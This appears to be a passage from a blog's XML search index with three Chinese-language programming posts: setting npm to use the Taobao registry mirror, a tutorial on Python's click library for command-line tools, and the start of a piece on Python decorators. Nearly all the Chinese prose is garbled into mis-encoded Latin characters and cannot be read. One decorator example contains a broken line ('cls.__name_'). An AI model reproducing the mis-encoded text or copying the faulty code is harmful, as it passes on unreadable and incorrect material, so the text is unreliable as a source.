    <content type="text"><![CDATA[ä¹‹å‰ä»‹ç»è¿‡ä½¿ç”¨vscodeæ­å»ºnodejså¼€å‘çŽ¯å¢ƒ, çŽ¯å¢ƒæ˜¯æ­å»ºå¥½äº†, ä½¿ç”¨æ—¶æœ‰ä¸€ä¸ªç¡¬ä¼¤, å°±æ˜¯nodejså®˜æ–¹çš„æºä¸‹è½½å¥‡æ…¢, è€Œä¸€èˆ¬jsçš„é¡¹ç›®ä¾èµ–åˆå¤š, æ‰€ä»¥ç»å¸¸çš„ç»“æžœå°±æ˜¯: æ…¢å¾—ä½ å•¥éƒ½è£…ä¸ä¸Š(time out)ã€‚æ€Žä¹ˆè§£å†³å–ƒï¼Ÿ å½“ç„¶æ˜¯æ¢å›½å†…çš„æºã€‚æˆ‘ä»…ä½¿ç”¨è¿‡æ·˜å®çš„åŠ é€Ÿæºï¼Œæ•ˆæžœä¸é”™ï¼Œä¸€ç›´ç”¨ç€ï¼Œä¸‹é¢åšç®€å•çš„ä»‹ç»ã€‚ ç®€ä»‹æ·˜å®NPMé•œåƒå®˜æ–¹æ˜¯è¿™æ ·æè¿°çš„: è¿™æ˜¯ä¸€ä¸ªå®Œæ•´ npmjs.org é•œåƒï¼Œä½ å¯ä»¥ç”¨æ­¤ä»£æ›¿å®˜æ–¹ç‰ˆæœ¬(åªè¯»)ï¼ŒåŒæ­¥é¢‘çŽ‡ç›®å‰ä¸º 10åˆ†é’Ÿ ä¸€æ¬¡ä»¥ä¿è¯å°½é‡ä¸Žå®˜æ–¹æœåŠ¡åŒæ­¥ã€‚å…³äºŽæ›´å¤šçš„ä¿¡æ¯è¯·æŸ¥çœ‹:æ·˜å®NPMæºå®˜ç½‘ åŒæ­¥ä»Žregistry.npm.taobao.orgå®‰è£…æ‰€æœ‰æ¨¡å—. å½“å®‰è£…çš„æ—¶å€™å‘çŽ°å®‰è£…çš„æ¨¡å—è¿˜æ²¡æœ‰åŒæ­¥è¿‡æ¥, æ·˜å®NPMä¼šè‡ªåŠ¨åœ¨åŽå°è¿›è¡ŒåŒæ­¥, å¹¶ä¸”ä¼šè®©ä½ ä»Žå®˜æ–¹ NPM registry.npmjs.org è¿›è¡Œå®‰è£…. ä¸‹æ¬¡ä½ å†å®‰è£…è¿™ä¸ªæ¨¡å—çš„æ—¶å€™, å°±ä¼šç›´æŽ¥ä»Ž æ·˜å® NPM å®‰è£…äº†. å®‰è£…ä¸´æ—¶ä½¿ç”¨çš„è¯, å¯ä»¥é€šè¿‡registryå‚æ•°æ¥æŒ‡å®šæ·˜å®æºåœ°å€ï¼Œæ¯”å¦‚1npm --registry=https://registry.npm.taobao.org xterm å½“ç„¶ä¹Ÿå¯ä»¥æ·»åŠ å‘½ä»¤åˆ«å,è¿™æ ·å°±ä¸ç”¨æ¯æ¬¡éƒ½æ·»åŠ â€“registryäº†12345678910alias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \--cache=$HOME/.npm/.cache/cnpm \--disturl=https://npm.taobao.org/dist \--userconfig=$HOME/.cnpmrc&quot;# Or alias it in .bashrc or .zshrc$ echo &apos;\n#alias for cnpm\nalias cnpm=&quot;npm --registry=https://registry.npm.taobao.org \ --cache=$HOME/.npm/.cache/cnpm \ --disturl=https://npm.taobao.org/dist \ --userconfig=$HOME/.cnpmrc&quot;&apos; &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc å…¶å®žæ·˜å®çš„æºå¾ˆç¨³å®šï¼ŒåŒæ­¥é¢‘çŽ‡ä¹Ÿå¿«ï¼Œå› æ­¤ä¸€èˆ¬ç›´æŽ¥æ›¿æ¢ç³»ç»Ÿçš„npmä¹Ÿå¯ä»¥1npm install -g cnpm --registry=https://registry.npm.taobao.org]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>æºåŠ é€Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonå‘½ä»¤è¡Œå¼€å‘ç¥žå™¨-click]]></title>
    <url>%2F2017%2F02%2F08%2Fpython-click%2F</url>
    <content type="text"><![CDATA[ä¹‹å‰å†™è¿‡ä¸€ç¯‡åšå®¢ä»‹ç»è¿‡å¦‚ä½•å†™æ¼‚äº®çš„å‘½ä»¤è¡Œå·¥å…·, ä¸è¿‡ä½¿ç”¨çš„æ˜¯golangçš„cobraåº“, æ•´ä½“è€Œè¨€æ•ˆæžœå’Œä½¿ç”¨ä½“éªŒè¿˜æ˜¯éžå¸¸ä¸é”™çš„, ä¸è¿‡ä»Šå¤©çœ‹åšå®¢æ—¶å‘çŽ°äº†ä¸€ä¸ªæ›´ä¸é”™çš„åº“ï¼Œè€Œä¸”æ˜¯Pythonçš„: Click,æ‰€ä»¥ç”¨èµ·æ¥åº”è¯¥æ›´å¾—å¿ƒåº”æ‰‹ã€‚ ä¹‹å‰åœ¨å¼€å‘openstackå®¢æˆ·ç«¯æ—¶, æ¨¡ä»¿openstack sdkå†™è¿‡CLI, ä»–ä¹Ÿæ˜¯å¯¹argparseåº“ä¸Šåšçš„å°è£…, ä½†æ˜¯ä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒå¤æ‚, ç®€å•çœ‹äº†ä¸‹clickçš„æ–‡æ¡£, ä½“éªŒè¿˜æ˜¯éžå¸¸ä¸é”™çš„ã€‚ ç®€ä»‹å…ˆè¯´ä¸‹clickçš„å‡ºç”Ÿ, å› ä¸ºä»–å‡ºç”Ÿåé—¨: Pocoo, Pocooæ˜¯ä¸€ä¸ªå›¢é˜Ÿï¼ŒPocooå‡ºå“å¿…æ˜¯ç²¾å“,æ¯”å¦‚ Flask, Werkzeug, Jinja 2 , Pygments, Sphinxã€‚å†²ç€pocooçš„å“ç‰Œ, éƒ½åº”è¯¥å¤šçœ‹ä¸€çœ¼clickã€‚clickæ˜¯ä¸€ä¸ªç”¨äºŽå¿«é€Ÿæž„å»ºå‘½ä»¤è¡Œçš„pythonçš„ç¬¬ä¸‰æ–¹æ¨¡å—, åŠŸèƒ½å¼ºå¤§, ä½¿ç”¨ç®€å•ã€‚æˆ‘ä»¬éƒ½çŸ¥é“Pythonå†…ç½®çš„Argparseæ¨¡å—ï¼Œä»¥å‰ä¹Ÿç»å¸¸ç”¨åˆ°, å½“æ—¶è§‰å¾—Argparseå¾ˆä¸é”™, å› ä¸ºæ²¡æœ‰å¯¹æ¯”(æ²¡æœ‰å¯¹æ¯”å°±æ²¡ä¼¤å®³), çœ‹äº†ä¸‹Clické©¬ä¸Šå°±è§‰å¾—Argparseå¤ªç¹çäº†ï¼ŒClickç›¸è¾ƒäºŽArgparseå°±å¥½æ¯”requestså¯¹æ¯”urllibã€‚æˆ‘ä»¬çœ‹çœ‹clickå®˜æ–¹æ–‡æ¡£ä¸Šæ˜¯æ€Žä¹ˆè¯´æ˜Žclickçš„ï¼š Clickæ˜¯ä¸€ä¸ªä½¿ç”¨æœ€å°‘ä»£ç æž„å»ºæ¼‚äº®CLIçš„å‘½ä»¤è¡Œç•Œé¢åˆ›å»ºå·¥å…·åŒ…, é«˜åº¦å¯é…ç½®,ä½†æ˜¯å´å¼€ç®±å³ç”¨ä»–æœ‰3ä¸ªç‰¹ç‚¹ï¼š æ”¯æŒå‘½ä»¤çš„ä»»æ„åµŒå¥— æ”¯æŒå‘½ä»¤è¡Œå¸®åŠ©é¡µé¢çš„è‡ªåŠ¨ç”Ÿæˆ æ”¯æŒå­å‘½ä»¤è¿è¡Œæ—¶æƒ°æ€§åŠ è½½ å¿«é€Ÿä½¿ç”¨æž„å»ºCLIæœ‰2ä¸ªè¦ç‚¹: å‘½ä»¤å’Œå‚æ•°, ä½¿ç”¨clickæ—¶ï¼Œ@click.command()ç”¨æˆ·è£…é¥°å‘½ä»¤, @click.option()å’Œ@click.argument()ç”¨äºŽè£…é¥°å‚æ•°, æ¯”å¦‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªç»å…¸çš„ä½¿ç”¨å½¢å¼:12345678910111213import click@click.command()@click.option('--count', default=1, help='Number of greetings.')@click.option('--name', prompt='Your name', help='The person to greet.')def hello(count, name): """Simple program that greets NAME for a total of COUNT times.""" for x in range(count): click.echo('Hello %s!' % name)if __name__ == '__main__': hello() ä¸ºäº†æ¼”ç¤ºä»–æ›´å¼ºå¤§çš„åŠŸèƒ½, æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªdockerçš„å‘½ä»¤è¡Œã€‚12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@volume.command()def create(): """Create a volume""" pass@volume.command()def inspect(): """isplay detailed information on one or more volumes""" pass@volume.command()@click.option('-f', '--filter', type=str, help="Provide filter values (e.g. 'dangling=true')")@click.option('-q', '--quiet', is_flag=True, help='Only display volume names')@click.option('--format', type=str, help='Pretty-print volumes using a Go template')def ls(filter, quiet, format): """List volumes""" print("%s, %s, %s" % (filter, quiet, format))@volume.command()@click.option('-f', '--force', type=str, help='Force the removal of a running container (uses SIGKILL)')@click.option('-l', '--link', type=str, help='Remove the specified link')@click.option('-v', '--volume', type=str, help='Remove the volumes associated with the container')def rm(force, link, volume): """Remove one or more volumes""" print("%s, %s, %s" % (force, link, volume))@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" pass@network.command()def connect(): """Connect a container to a network""" pass@network.command()def ls(): """List networks""" pass@network.command()def rm(): """Remove one or more networks""" passif __name__ == '__main__': docker() æœ€ç»ˆæ•ˆæžœå¦‚ä¸‹:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859âžœ test python3 test.pyUsage: test.py [OPTIONS] COMMAND [ARGS]...Options: --help Show this message and exit.Commands: network Manage networks volume Manage volumesâžœ test python3 test.py networkUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: connect Connect a container to a network create Create a network ls List networks rm Remove one or more networksâžœ test python3 test.py volumeUsage: test.py volume [OPTIONS] COMMAND [ARGS]... Manage volumesOptions: --help Show this message and exit.Commands: create Create a volume inspect isplay detailed information on one or more... ls List volumes rm Remove one or more volumesâžœ test python3 test.py volume ls --helpUsage: test.py volume ls [OPTIONS] List volumesOptions: -f, --filter TEXT Provide filter values (e.g. &apos;dangling=true&apos;) -q, --quiet Only display volume names --format TEXT Pretty-print volumes using a Go template --help Show this message and exit.âžœ test python3 test.py volume rm --helpUsage: test.py volume rm [OPTIONS] Remove one or more volumesOptions: -f, --force TEXT Force the removal of a running container (uses SIGKILL) -l, --link TEXT Remove the specified link -v, --volume TEXT Remove the volumes associated with the container --help Show this message and exit. å‘½ä»¤ä¸Žç»„è¿™æ˜¯clickä¸­æœ€é‡è¦çš„æ¦‚å¿µ, æˆ‘ä»¬å¯ä»¥é€šè¿‡commandå’Œgroupè£…é¥°å™¨å®žçŽ°ä¸€ä¸ªæ— é™åµŒå¥—çš„å‘½ä»¤è¡Œå·¥å…·, å…¶ä¸­commandç”¨æˆ·è£…é¥°å‘½ä»¤, groupç”¨äºŽå°†å‘½ä»¤åˆ†ç»„(ç±»)ä¸Šé¢é‚£ä¸ªæ¨¡å—dockerå‘½ä»¤è¡Œå°±æ˜¯åˆ†ç»„çš„ä½¿ç”¨ã€‚123456789101112131415161718192021222324import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()def create(): """Create a network""" passif __name__ == '__main__': docker() å‘½ä»¤è¡Œå‚æ•°ä»Žå‘½ä»¤è¡Œè¯»å–å‚æ•°å€¼ï¼Œå†å°†å…¶ä¼ é€’ç»™å‡½æ•°,è¯»å–çš„å‚æ•°åˆ†ä¸ºä¸¤ç±»: å¯é€‰å‚æ•°å’Œå¿…é¡»å‚æ•°ï¼Œä¸‹é¢åˆ†åˆ«åšä»‹ç» å¯é€‰å‚æ•°ä½¿ç”¨@click.optionè£…é¥°å™¨å®Œæˆå¯é€‰å‚æ•°çš„å½•å…¥, é€šè¿‡ä¸Šé¢çš„æ —å­æˆ‘ä»¬å¯ä»¥å‘çŽ°è¯¥è£…é¥°å™¨æœ‰å¾ˆå¤šå‚æ•°å‰é¢2ä¸ªä½ç½®å‚æ•°æ¯”å¦‚â€™-fâ€™, â€˜â€“forceâ€™ç”¨äºŽæè¿°å‚æ•°åç§°, typeæŒ‡æ˜Žå‚æ•°ç­‰ï¼Œoptionå¸¸ç”¨çš„è®¾ç½®å‚æ•°å¦‚ä¸‹ï¼š default: è®¾ç½®å‘½ä»¤è¡Œå‚æ•°çš„é»˜è®¤å€¼ help: å‚æ•°è¯´æ˜Ž type: å‚æ•°ç±»åž‹ï¼Œå¯ä»¥æ˜¯ string, int, float ç­‰ prompt: å½“åœ¨å‘½ä»¤è¡Œä¸­æ²¡æœ‰è¾“å…¥ç›¸åº”çš„å‚æ•°æ—¶ï¼Œä¼šæ ¹æ® prompt æç¤ºç”¨æˆ·è¾“å…¥ nargs: æŒ‡å®šå‘½ä»¤è¡Œå‚æ•°æŽ¥æ”¶çš„å€¼çš„ä¸ªæ•°æˆ‘ä»¬å¯ä»¥ä¾ç„¶è¿™äº›é€‰é¡¹æ¥å®Œæˆæˆ‘ä»¬å¾ˆé•¿å¸¸ç”¨çš„åŠŸèƒ½ é»˜è®¤å‚æ•°ç»å¸¸æˆ‘ä»¬éœ€è¦ä¸ºå‚æ•°è®¾ç½®ä¸€äº›é»˜è®¤å€¼, ä½¿ç”¨defaultæŒ‡å®šå‚æ•°çš„é»˜è®¤å€¼å°±èƒ½åŠžåˆ°, å°±è¿™ä¹ˆç®€å•12345678910111213141516171819202122232425import click@click.group()def docker(): pass@docker.group()def volume(): """Manage volumes""" pass@docker.group()def network(): """Manage networks""" pass@network.command()@click.option('-n', '--name', type=str, default='flat', help='The network name')def create(name): """Create a network""" click.echo('create network %s success' % name)if __name__ == '__main__': docker() è¿è¡Œç»“æžœ:123456789101112âžœ test python3 test.py network --helpUsage: test.py network [OPTIONS] COMMAND [ARGS]... Manage networksOptions: --help Show this message and exit.Commands: create Create a networkâžœ test python3 test.py network createcreate network flat success é€‰æ‹©å‚æ•°å¾ˆå¤šæƒ…å†µä¸‹, æˆ‘ä»¬ä¹Ÿä¼šç»™ç”¨æˆ·ä¸€äº›é€‰æ‹©å‚æ•°, æ¯”å¦‚æ€§åˆ«å°±åªèƒ½é€‰æ‹©(M/F), å› æ­¤æˆ‘ä»¬åº”è¯¥æç¤ºç”¨æˆ·è¾“å…¥æ­£ç¡®çš„å€¼,åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ click.Choice() æ¥é™å®š1234567891011@user.command()@click.option('-g', '--gender', type=click.Choice(['male', 'female']), help="The user's gender")@click.help_option('-h', '--help')def create(gender): """Create a user""" if gender is None: raise click.BadOptionUsage("miss gender choice!") click.echo("user's gender is %s" % gender)if __name__ == '__main__': docker() å¤šå€¼å‚æ•°æœ‰æ—¶ï¼Œä¸€ä¸ªå‚æ•°éœ€è¦æŽ¥æ”¶å¤šä¸ªå€¼, æ¯”å¦‚æˆ‘ä»¬ç®—ä¸€ä¸ªç«‹æ–¹ä½“çš„ä½“ç§¯, è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€æ±‚é€šè¿‡nargsæŒ‡å®š è¯¥å‚æ•°æŽ¥æ”¶å¤šå°‘ä¸ªå€¼, æ¯”å¦‚123456789@cube.command()@click.option('-p', '--profile', type=int, nargs=3 ,help="The cube Length, width and height")@click.help_option('-h', '--help')def volume(profile): """Compute cube's volume""" if profile is None: raise click.BadOptionUsage("miss profile!") v = profile[0] * profile[1] * profile[2] click.echo("the cube's volume is %s" % v) å¯†ç å‚æ•°å‘½ä»¤è¡Œæˆ‘ä»¬å¸¸å¸¸æœ‰è¾“å…¥å¯†ç çš„éœ€æ±‚ï¼Œè¿™ä¸ªæˆ‘ä»¬åº”è¯¥æ€Žä¹ˆç”¨å–ƒï¼Ÿ123456@user.command()@click.option('-p', '--password', prompt=True, hide_input=True, confirmation_prompt=True)@click.help_option('-h', '--help')def create(password): """Create a user""" click.echo('Encrypting password to %s' % password) è¿™ä¸ªçœ‹ä¸‹æ•ˆæžœ:1234âžœ test python3 test.py user createPassword:Repeat for confirmation:Encrypting password to 123 å¿…é€‰å‚æ•°ç›¸è¾ƒäºŽå¯é€‰å‚æ•°çš„çµæ´»æ€§è€Œè¨€, å¿…é¡»å‚æ•°æ¯”è¾ƒç®€å•äº†ã€‚ç”¨@click.argumentæ¥æ·»åŠ å›ºå®šå‚æ•°ã€‚ å®šå‚è¿™é‡Œéœ€è¦ä¸»è¦ä½ç½®å‚æ•°çš„é¡ºåºäº†ã€‚æ¯”å¦‚3ä¸ªå®šå‚æ•° x y z1234567@user.command()@click.argument('x')@click.argument('y')@click.argument('z')def create(x, y, z): """Create a user""" click.echo("%s, %s, %s" % (x, y, z)) 12345678910âžœ test python3 test.py user create 1Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "y".âžœ test python3 test.py user create 1 2Usage: test.py user create [OPTIONS] X Y ZError: Missing argument "z".âžœ test python3 test.py user create 1 2 31, 2, 3 ä¸å®šå‚å‚æ•°ä¸å®šçš„æƒ…å†µä¹Ÿæ˜¯å¸¸æœ‰çš„, æ¯”å¦‚æˆ‘ä»¬æƒ³å°†å¤šä¸ªæ–‡ä»¶ç§»åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢, src: file1 file2 file3 dir: file4ã€‚æˆ‘ä»¬è®©nargs=-1å°±å¯ä»¥äº†, ä»–è¡¨ç¤ºæŽ¥æ”¶[:-1]çš„å‚æ•°1234567@user.command()@click.argument('src', nargs=-1)@click.argument('dst', nargs=1)def create(src, dst): """Create a user""" click.echo("src: %s" % ' '.join(list(src))) click.echo("dst: %s" % dst) 123âžœ test python3 test.py user create file1 file2 file3 file4src: file1 file2 file3dst: file4 å…¶ä»–åŠŸèƒ½clickè¿˜æœ‰æ¯”è¾ƒå¤šçš„é«˜çº§åŠŸèƒ½ï¼Œæ¯”å¦‚åˆ†é¡µå’Œå½©è‰²æ‰“å°, clickæ–‡æ¡£å†™å¾—æ¯”è¾ƒå¥½: clickå®˜æ–¹æ–‡æ¡£ æ€»ç»“pocooéžå¸¸çƒ­è¡·äºŽä½¿ç”¨è£…é¥°å™¨, å¯ä»¥è¯´ä»–ä»¬å¯¹è£…é¥°å™¨çš„ä½¿ç”¨ç®€ç›´å‡ºç¥žå…¥åŒ–, åœ¨flaské‡Œé¢å°±å¯è§ä¸€æ–‘, è€Œå‰ä¸€ç¯‡æ‰è®²äº†è£…é¥°å™¨, è¿™ä¸ªclickåº“é‡Œé¢å¯¹è£…é¥°å™¨çš„ä½¿ç”¨ä¹Ÿç§°å¾—ä¸Šå…¸èŒƒ, æºç å¾ˆå€¼å¾—ä¸€è¯»ã€‚]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>click</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonè¿›é˜¶ç³»åˆ—-è£…é¥°å™¨]]></title>
    <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
    <content type="text"><![CDATA[è£…é¥°å™¨æ˜¯ä¸€ä¸ªéžå¸¸é‡è¦çš„æ¦‚å¿µï¼Œå¯èƒ½ç®—æ˜¯è¿›é˜¶çš„ä¸€å¤§é—¨æ§›ã€‚è£…é¥°å™¨å…è®¸å‘ä¸€ä¸ªçŽ°æœ‰çš„å¯¹è±¡æ·»åŠ æ–°çš„åŠŸèƒ½ï¼ŒåŒæ—¶åˆä¸æ”¹å˜å…¶ç»“æž„,æ˜¯ä¸€ç§åŠŸèƒ½å¢žå¼ºçš„æ¨¡å¼ã€‚åœ¨é¢å‘å¯¹è±¡(OOP)çš„è®¾è®¡æ¨¡å¼ä¸­ï¼Œdecoratorè¢«ç§°ä¸ºè£…é¥°æ¨¡å¼ã€‚OOPçš„è£…é¥°æ¨¡å¼éœ€è¦é€šè¿‡ç»§æ‰¿å’Œç»„åˆæ¥å®žçŽ°ï¼Œè€ŒPythoné™¤äº†èƒ½æ”¯æŒOOPçš„decoratorå¤–ï¼Œç›´æŽ¥ä»Žè¯­æ³•å±‚æ¬¡æ”¯æŒdecoratorã€‚Pythonçš„decoratorå¯ä»¥ç”¨å‡½æ•°å®žçŽ°ï¼Œä¹Ÿå¯ä»¥ç”¨ç±»å®žçŽ°ã€‚æŽ¥ä¸‹æ¥å°†å…¨é¢ä»‹ç»å…³äºŽPythonè£…é¥°å™¨ç›¸å…³çš„çŸ¥è¯†ã€‚ ç®€ä»‹è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªPythonå‡½æ•°ï¼Œå®ƒå¯ä»¥è®©å…¶ä»–å‡½æ•°åœ¨ä¸éœ€è¦åšä»»ä½•ä»£ç å˜åŠ¨çš„å‰æä¸‹å¢žåŠ é¢å¤–åŠŸèƒ½ï¼Œè£…é¥°å™¨çš„è¿”å›žå€¼ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ã€‚å®ƒç»å¸¸ç”¨äºŽæœ‰åˆ‡é¢éœ€æ±‚çš„åœºæ™¯ï¼Œæ¯”å¦‚ï¼šæ’å…¥æ—¥å¿—ã€æ€§èƒ½æµ‹è¯•ã€äº‹åŠ¡å¤„ç†ã€ç¼“å­˜ã€æƒé™æ ¡éªŒç­‰åœºæ™¯ã€‚è£…é¥°å™¨æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„ç»ä½³è®¾è®¡ï¼Œæœ‰äº†è£…é¥°å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠ½ç¦»å‡ºå¤§é‡ä¸Žå‡½æ•°åŠŸèƒ½æœ¬èº«æ— å…³çš„é›·åŒä»£ç å¹¶ç»§ç»­é‡ç”¨ã€‚æ¦‚æ‹¬çš„è®²ï¼Œè£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯ä¸ºå·²ç»å­˜åœ¨çš„å‡½æ•°æˆ–å¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚ å¼•å­åœ¨Pythoné‡Œï¼Œä¸€åˆ‡çš†å¯¹è±¡, å‡½æ•°æ›´æ˜¯å¤´ç­‰å¯¹è±¡ï¼Œå‡½æ•°å¯¹è±¡å¯ä»¥è¢«èµ‹å€¼ç»™å˜é‡ï¼Œæ‰€ä»¥ï¼Œé€šè¿‡å˜é‡ä¹Ÿèƒ½è°ƒç”¨è¯¥å‡½æ•°12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' çŽ°åœ¨ï¼Œå‡è®¾æˆ‘ä»¬è¦å¢žå¼ºnow()å‡½æ•°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼Œåœ¨å‡½æ•°è°ƒç”¨å‰åŽè‡ªåŠ¨æ‰“å°æ—¥å¿—ï¼Œä½†åˆä¸å¸Œæœ›ä¿®æ”¹now()å‡½æ•°çš„å®šä¹‰,è¯¥æ€Žä¹ˆåšå–ƒï¼Ÿæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯åŠ¨æ€æ›¿æ¢nowï¼Œå¹¶ä¿æŒå‡½æ•°ç­¾åä¸å˜123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() ä¸ºäº†æ–¹ä¾¿pythonåœ¨è¯­æ³•å±‚é¢å°±å·²ç»æ”¯æŒäº†è£…é¥°å™¨(python &gt; 2.4),@è¯­æ³•ç³–å®žé™…ä¸Šå°±ç­‰äºŽnow = debug(now), å› æ­¤å®žé™…ä¸Šåº”è¯¥è¿™æ ·å†™1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() è¿™ä¸ªdubugè£…é¥°å™¨æœ‰ä¸ªå·¨å¤§çš„ç¼ºé™·: æˆ‘ä»¬åªèƒ½è£…é¥°ä¸å¸¦å‚æ•°çš„å‡½æ•°ã€‚å®žé™…ä¸Šå‡½æ•°çš„å½¢å¼å„ç§å„æ ·ï¼Œå¦‚ä½•æ‰èƒ½ä¸€ä¸ªè£…é¥°å™¨é€‚é…å„ç§å‡½æ•°å–ƒï¼Ÿpythonæä¾›çš„å¯å˜å‚æ•°å¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") å¦‚æ­¤ä¸€ä¸ªåŸºç¡€çš„è£…é¥°å™¨å°±å†™å®Œäº†ï¼Œä»¥ä¸‹å°†ä»‹ç»å„å¼å„æ ·çš„è£…é¥°å™¨ã€‚ å‡½æ•°å¼è£…é¥°å™¨è£…é¥°å™¨æœ¬èº«æ˜¯ä¸€ä¸ªå‡½æ•° è£…é¥°å‡½æ•°è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå‡½æ•°, wrapperæ˜¯å¯¹å‡½æ•°çš„å¢žå¼º åŸºç¡€-è£…é¥°å™¨æ— å‚æ•°è¿™æ˜¯æœ€åŸºç¡€çš„ä¸€ç§è£…é¥°å™¨, åœ¨å¼•å­ä¸­å·²ç»æœ‰æ —å­äº†ã€‚ é«˜çº§-è£…é¥°å™¨æœ‰å‚æ•°å¸¦å‚æ•°çš„è£…é¥°å™¨å’Œç±»è£…é¥°å™¨å±žäºŽè¿›é˜¶çš„å†…å®¹ã€‚åœ¨ç†è§£è¿™äº›è£…é¥°å™¨ä¹‹å‰ï¼Œæœ€å¥½å¯¹å‡½æ•°çš„é—­åŒ…å’Œè£…é¥°å™¨çš„æŽ¥å£çº¦å®šæœ‰ä¸€å®šäº†è§£ã€‚å…³äºŽpythonä¸­çš„é—­åŒ…æ¦‚å¿µæˆ‘åœ¨ä¸‹ä¸€ç¯‡ä¸­ä¼šå•ç‹¬ä»‹ç»,è¿™é‡Œä½ åªéœ€è¦çŸ¥é“é—­åŒ…æ˜¯ä¸€ä¸ªæºå¸¦çŠ¶æ€çš„å‡½æ•°å³å¯ã€‚å®žé™…ä¸Šå°±æ˜¯è¿”å›žè£…é¥°å™¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªè£…é¥°å™¨æºå¸¦å¤–éƒ¨å˜é‡(è¿™å°±æ˜¯é—­åŒ…)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") è£…é¥°ç±»è¢«è£…é¥°çš„å¯¹è±¡æ˜¯ä¸€ä¸ªç±»,wrapperæ˜¯å¯¹ç±»çš„å¢žå¼º,æ‰€ä»¥è£…é¥°å™¨çš„å˜åŒ–å¹¶ä¸å¤§,ç”šè‡³å¯ä»¥æ²¿ç”¨ åŸºç¡€-è£…é¥°å™¨æ— å‚æ•°123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") é«˜çº§-è£…é¥°å™¨æœ‰å‚æ•°1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") ç±»å¼è£…é¥°å™¨è£…é¥°å™¨å‡½æ•°å…¶å®žæ˜¯è¿™æ ·ä¸€ä¸ªæŽ¥å£çº¦æŸï¼Œå®ƒå¿…é¡»æŽ¥å—ä¸€ä¸ªcallableå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œç„¶åŽè¿”å›žä¸€ä¸ªcallableå¯¹è±¡ã€‚åœ¨Pythonä¸­ä¸€èˆ¬callableå¯¹è±¡éƒ½æ˜¯å‡½æ•°ï¼Œä½†ä¹Ÿæœ‰ä¾‹å¤–ã€‚åªè¦æŸä¸ªå¯¹è±¡é‡è½½äº† call () æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å°±æ˜¯callableçš„ã€‚æˆ‘ä»¬å¯ä»¥è®©ç±»çš„æž„é€ å‡½æ•° init () æŽ¥å—ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åŽé‡è½½ call () å¹¶è¿”å›žä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°è£…é¥°å™¨å‡½æ•°çš„æ•ˆæžœã€‚ 